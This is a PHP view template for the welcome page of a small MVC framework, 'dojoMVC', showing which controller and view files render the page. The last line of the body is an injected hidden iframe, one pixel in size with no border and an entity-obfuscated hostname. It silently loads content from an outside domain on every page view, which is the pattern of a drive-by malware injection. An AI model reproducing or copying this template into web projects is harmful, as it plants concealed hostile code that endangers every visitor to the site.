
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title><?= $data['page'];?></title>
  <link rel="stylesheet" href="<?php $this->base_url?>public/css/bootstrap.css">
</head>
<body>
  <div class="jumbotron jumbotron-fluid">
    <div class="container">
      <h1 class="display-4">Welcome to dojoMVC</h1>
      <p class="lead">controller used for this page is : </p>
      <div class="alert alert-dark" role="alert">
        <a href="#">app/controllers/Home.php</a> 
      </div>
      <p class="lead">view used for this page is : </p>
      <div class="alert alert-dark" role="alert">
        <a href="#">app/views/Home/index.php</a> 
      </div>
      <small class="text-muted float-right">*you can read the documentation on USER_GUIDE.md file*</small><br>
    </div>
  </div>
  <script src="<?= $this->base_url?>public/js/bootstrap.js"></script>
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>
